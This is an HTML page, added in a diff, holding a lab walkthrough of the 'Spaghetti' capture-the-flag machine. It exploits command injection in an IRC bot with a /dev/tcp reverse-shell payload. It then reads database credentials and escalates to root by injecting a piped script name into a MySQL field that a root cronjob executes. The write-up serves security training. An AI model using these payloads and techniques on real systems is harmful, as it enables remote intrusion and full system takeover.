@@ -1,0 +1,204 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Spaghetti Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Spaghetti Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#hostmaster">Shell - hostmaster</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Gaining a foothold on Spaghetti involved exploiting a command being offered by a bot on an irc server.  Exploitation of this command leads to RCE as a low privilege user.  Once in the box, we are able to achieve root command execution by exploiting a script that root runs as a cronjob.  This script uses contents of the mysql table "mailbox" for the parameters that it passes.  The mysql credentials are found in the web server config files.  Upon modifying the contents of mysql we are able to execute our own malicious script as root.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Sat Sep 18 15:46:26 2021 as: nmap -p- -oN ping_tcp 192.168.248.160
+Nmap scan report for 192.168.248.160
+Host is up (0.044s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+6667/tcp open  irc
+8080/tcp open  http-proxy
+
+# Nmap done at Sat Sep 18 15:47:11 2021 -- 1 IP address (1 host up) scanned in 44.14 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Sat Sep 18 15:48:13 2021 as: nmap -p22,25,80,6667,8080 -sV -sC -oN script_tcp 192.168.248.160
+Nmap scan report for 192.168.248.160
+Host is up (0.040s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+25/tcp   open  smtp    Postfix smtpd
+|_smtp-commands: spaghetti.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+| ssl-cert: Subject: commonName=spaghetti.lan
+| Subject Alternative Name: DNS:spaghetti.lan
+| Not valid before: 2021-03-09T11:39:07
+|_Not valid after:  2031-03-07T11:39:07
+|_ssl-date: TLS randomness does not represent time
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Spaghetti Mail
+6667/tcp open  irc
+| irc-info: 
+|   users: 2
+|   servers: 1
+|   chans: 1
+|   lusers: 2
+|   lservers: 0
+|   server: irc.spaghetti.lan
+|   version: InspIRCd-3. irc.spaghetti.lan 
+|   source ident: nmap
+|   source host: 192.168.49.248
+|_  error: Closing link: (nmap@192.168.49.248) [Client exited]
+8080/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-title: Postfix Admin - 192.168.248.160:8080
+|_Requested resource was login.php
+Service Info: Hosts:  spaghetti.lan, irc.spaghetti.lan; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 18 15:48:36 2021 -- 1 IP address (1 host up) scanned in 22.81 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The first real point of interest comes from the irc server on port 6667.  I used the program hexchat to connect to the irc server.  There is a room on this irc server named #mailAssistant with a user/bot in it named spaghetti_BoT.  Once in the irc room you can send the message "hello" and the bot responds telling us to send it a DM with "!command"</li>
+
+    <img src="../images/spaghetti/irc_1.png">
+
+    <br>
+
+    <img src="../images/spaghetti/irc_2.png">
+
+    <br>
+    <br>
+
+    <li>We have learned two things so far about the bot</li>
+    <ul>
+        <li>We can send it a command for email issues using: "email:&lt;email address&gt; description:&lt;description&gt;"</li>
+        <li>The bot is PyBot and we have the link to the bot's github page</li>
+    </ul>
+
+    <h2><a id="hostmaster">Shell - hostmaster</a></h2>
+
+    <li>On the github page for the bot and we can see a vulnerability in the code behind the command allowing us to submit email issues.</li>
+        <ul>
+            <li>The code for the command to send a message to report an issue.</li>
+            <ul>
+                <li>The description that we send gets assigned to the variable "body"</li>
+                <img src="../images/spaghetti/code_body_variable.png">
+            </ul>
+        </ul>
+        <ul>
+            <li>The code that sends the email.</li>
+        <img src="../images/spaghetti/irc_bot_code.png">
+    </ul>
+
+    <li>The user input does not go through any sanitization.  It gets passed directly into the "cmd" variable which then gets executed as a shell command.  In order to exploit this all we need to do is add a pipe before whatever command we want to send in the "description" portion of the command for email issues.</li>
+
+    <br>
+
+    <li>I send a command and receieve a reverse shell on 4444</li>
+    <ul>
+        <li>Sent: email:test@test.com description:| bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.49.248/4444 0&gt;&amp;1&#039;</li>
+    </ul>
+    <img src="../images/spaghetti/revshell.png">
+
+    <br>
+    <br>
+    
+    <li>Upon getting a reverse shell I upgrade it to a pty, enable the "clear" command, and enable auto-compelete.</li>
+    
+    <pre>
+hostmaster@spaghetti:~$ python3 -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;)&quot;;
+python3 -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;)&quot;;
+hostmaster@spaghetti:~$ export TERM=xterm
+export TERM=xterm
+hostmaster@spaghetti:~$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                                                                              
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Spaghetti/nmap]
+&#x2514;&#x2500;$ stty raw -echo;fg;                                                                                                                              148 &#x2a2f; 1 &#x2699;
+[1]  + continued  nc -lvnp 4444
+    </pre>
+
+    <h2><a id="root">Shell - root</a></h2>
+
+    <li>At this point we already know mysql is running on the box.  So I look for the credentials.  They are found in /var/www/config.local.php</li>
+
+    <pre>
+hostmaster@spaghetti:/var/www/postfixadmin$ cat config.local.php &#13;&#10;&lt;?php&#13;&#10;$CONF[&apos;configured&apos;] = true;&#13;&#10;$CONF[&apos;password_expiration&apos;] = &apos;YES&apos;;&#13;&#10;$CONF[&apos;database_type&apos;] = &apos;mysqli&apos;;&#13;&#10;$CONF[&apos;database_host&apos;] = &apos;localhost&apos;;&#13;&#10;$CONF[&apos;database_user&apos;] = &apos;postfixadmin&apos;;&#13;&#10;$CONF[&apos;database_password&apos;] = &apos;P4s8vV0r6&apos;;&#13;&#10;$CONF[&apos;database_name&apos;] = &apos;postfixadmin&apos;;
+    </pre>
+
+    <li>Up front, the only interesting thing in the mysql database is a password hash that I am unable to crack.  So I continue looking.  The next interesting thing I find is the script /opt/check_mailpass_expiration.sh</li>
+
+    <pre>
+hostmaster@spaghetti:/opt$ cat check_mailpass_expiration.sh &#13;&#10;#!/bin/bash&#13;&#10;#Adapt to your setup&#13;&#10;&#13;&#10;POSTFIX_DB=&quot;postfixadmin&quot;&#13;&#10;MYSQL_CREDENTIALS_FILE=&quot;/root/postfixadmin.my.cnf&quot;&#13;&#10;&#13;&#10;REPLY_ADDRESS=noreply@spaghetti.lan&#13;&#10;&#13;&#10;# Change this list to change notification times and when ...&#13;&#10;for INTERVAL in 30 14 7&#13;&#10;do&#13;&#10;    LOWER=$(( $INTERVAL - 1 ))&#13;&#10;&#13;&#10;    QUERY=&quot;SELECT username,password_expiry FROM mailbox WHERE password_expiry &gt; now() + interval $LOWER DAY AND password_expiry &lt; NOW() + interval $INTERVAL DAY&quot;&#13;&#10;&#13;&#10;    mysql --defaults-extra-file=&quot;$MYSQL_CREDENTIALS_FILE&quot; &quot;$POSTFIX_DB&quot; -B -e &quot;$QUERY&quot; | while read -a RESULT ; do&#13;&#10;        echo -e &quot;Dear User, \n Your password will expire on ${RESULT[1]}&quot; | mail -s &quot;Password 30 days before expiration notication&quot; -r $REPLY_ADDRESS  ${RESULT[0]}&#13;&#10;    done&#13;&#10;&#13;&#10;done
+    </pre>
+
+    <li>This is a script that sends a notification to each user from the mailbox table of the mysql database whenever their password expiration date is 7, 14, and 30 days away.  Based on the fact that this is a ctf scenario and the fact that this file is owned by root, executable, but not writable by us, leads me to believe that root is executing this file.  We transfer the program pspy64 to the machine and run it to look at proccesses that are being ran.  pspy confirms that root is executing this file.</li>
+        
+    <pre>
+hostmaster@spaghetti:/tmp$ ./pspy64&amp;#13;&amp;#10;./pspy64&amp;#13;&amp;#10;pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855&amp;#13;&amp;#10;&amp;#13;&amp;#10;&amp;#13;&amp;#10;     &amp;block;&amp;block;&amp;blk34;&amp;block;&amp;block;&amp;block;    &amp;block;&amp;block;&amp;block;&amp;block;&amp;block;&amp;block;  &amp;block;&amp;block;&amp;blk34;&amp;block;&amp;block;&amp;block; &amp;blk34;&amp;block;&amp;block;   &amp;block;&amp;block;&amp;blk34;&amp;#13;&amp;#10;    &amp;blk34;&amp;block;&amp;block;&amp;blk14;  &amp;block;&amp;block;&amp;blk12;&amp;blk12;&amp;block;&amp;block;    &amp;blk12; &amp;blk34;&amp;block;&amp;block;&amp;blk14;  &amp;block;&amp;block;&amp;blk12;&amp;blk12;&amp;block;&amp;block;  &amp;block;&amp;block;&amp;blk12;&amp;#13;&amp;#10;    &amp;blk34;&amp;block;&amp;block;&amp;blk14; &amp;block;&amp;block;&amp;blk34;&amp;blk12;&amp;blk14; &amp;blk34;&amp;block;&amp;block;&amp;lhblk;   &amp;blk34;&amp;block;&amp;block;&amp;blk14; &amp;block;&amp;block;&amp;blk34;&amp;blk12; &amp;blk12;&amp;block;&amp;block; &amp;block;&amp;block;&amp;blk14;&amp;#13;&amp;#10;    &amp;blk12;&amp;block;&amp;block;&amp;lhblk;&amp;block;&amp;blk34;&amp;blk12; &amp;blk12;  &amp;blk12;   &amp;block;&amp;block;&amp;blk12;&amp;blk12;&amp;block;&amp;block;&amp;lhblk;&amp;block;&amp;blk34;&amp;blk12; &amp;blk12; &amp;blk14; &amp;#9616;&amp;block;&amp;block;&amp;blk34;&amp;blk14;&amp;#13;&amp;#10;    &amp;blk12;&amp;block;&amp;block;&amp;blk12; &amp;blk14;  &amp;blk14;&amp;blk12;&amp;block;&amp;block;&amp;block;&amp;block;&amp;block;&amp;block;&amp;blk12;&amp;blk12;&amp;blk12;&amp;block;&amp;block;&amp;blk12; &amp;blk14;  &amp;blk14; &amp;blk14; &amp;block;&amp;block;&amp;blk12;&amp;blk34;&amp;blk14;&amp;#13;&amp;#10;    &amp;blk12;&amp;blk34;&amp;blk12;&amp;blk14; &amp;blk14;  &amp;blk14;&amp;blk12; &amp;blk12;&amp;blk34;&amp;blk12; &amp;blk12; &amp;blk14;&amp;blk12;&amp;blk34;&amp;blk12;&amp;blk14; &amp;blk14;  &amp;blk14;  &amp;block;&amp;block;&amp;blk12;&amp;blk12;&amp;blk12; &amp;#13;&amp;#10;    &amp;blk14;&amp;blk12; &amp;blk14;     &amp;blk14; &amp;blk14;&amp;blk12;  &amp;blk14; &amp;blk14;&amp;blk14;&amp;blk12; &amp;blk14;     &amp;blk34;&amp;block;&amp;block; &amp;blk14;&amp;blk12;&amp;blk14; &amp;#13;&amp;#10;    &amp;blk14;&amp;blk14;       &amp;blk14;  &amp;blk14;  &amp;blk14;  &amp;blk14;&amp;blk14;       &amp;blk12; &amp;blk12; &amp;blk14;&amp;blk14;  &amp;#13;&amp;#10;                   &amp;blk14;           &amp;blk14; &amp;blk14;     &amp;#13;&amp;#10;                               &amp;blk14; &amp;blk14;     &amp;#13;&amp;#10;&amp;#13;&amp;#10;Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)&amp;#13;&amp;#10;Draining file system events due to startup...&amp;#13;&amp;#10;done&amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=0    PID=990    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal &amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=0    PID=99     | &amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=112  PID=986    | /usr/sbin/mysqld &amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=0    PID=98     | &amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=33   PID=974    | php-fpm: pool www                                                             &amp;#13;&amp;#10;2021/09/20 18:36:44 CMD: UID=33   PID=973    | php-fpm: pool www                                                             &amp;#13;&amp;#10;   (LINES REMOVED)&amp;#13;&amp;#10;2021/09/20 18:37:01 CMD: UID=0    PID=228290 | /usr/sbin/CRON -f &amp;#13;&amp;#10;2021/09/20 18:37:01 CMD: UID=0    PID=228293 | /bin/sh -c /opt/check_mailpass_expiration.sh 
+    </pre>
+
+    <li>Now that we know root is running this command, we also know that we can get command execution as root if we can exploit this script somehow.  This script is checking the user's password expiration date and if it is going to expire in 7, 14, or 30 days, then it sends them a notification.  ${RESULT[0]} is where the username from the mysql table "mailbox" is inserted into the script.  We are going to create a malicious script that we will pass to /opt/check_mailpass_expiration.sh that will create a root owned SUID bash file in the /tmp directory.</li>
+
+    <br>
+
+    <li>The malicious script</li>
+
+    <pre>
+hostmaster@spaghetti:/tmp$ cat rooted.sh 
+cp /bin/bash /tmp/rooted; chmod +s /tmp/rooted;
+hostmaster@spaghetti:/tmp$ chmod +x rooted.sh
+    </pre>
+
+    <li>Now we will change the username in the mysql table "mailbox" to our script with a pipe in front of it.  Then we will change the password expiration date to 7 days from now in order to trigger root to run the script.</li>
+
+    <pre>
+mysql&gt; select username,password_expiry from mailbox;&#13;&#10;+----------------------------+---------------------+&#13;&#10;| username                   | password_expiry     |&#13;&#10;+----------------------------+---------------------+&#13;&#10;| giuseppe.verdi@private.lan | 2021-09-27 18:57:24 |&#13;&#10;+----------------------------+---------------------+&#13;&#10;1 row in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; update mailbox set username=&apos;|/tmp/rooted.sh&apos;;&#13;&#10;Query OK, 1 row affected (0.00 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0&#13;&#10;&#13;&#10;mysql&gt; update mailbox set password_expiry=(select now() + interval 7 day);&#13;&#10;Query OK, 1 row affected (0.01 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0
+    </pre>
+
+    <li>Now we wait a little bit and the file "rooted" should be created in the /tmp directory.  It will be owned by root with the suid bit set.  We execute this file with the -p flag and we get root.  The -p flag means persistent.  It saves the root permissions of the bash file to our own session.</li>
+
+    <pre>
+hostmaster@spaghetti:/tmp$ ls -la /tmp/rooted&#13;&#10;-rwsr-sr-x 1 root root 1183448 Sep 20 19:07 /tmp/rooted&#13;&#10;hostmaster@spaghetti:/tmp$ ./rooted -p&#13;&#10;rooted-5.0# id&#13;&#10;uid=1000(hostmaster) gid=1000(hostmaster) euid=0(root) egid=0(root) groups=0(root),33(www-data),1000(hostmaster)&#13;&#10;rooted-5.0# 
+    </pre>
+
+    <li>Rooted.</li>
+
+</body>
+</html>
+
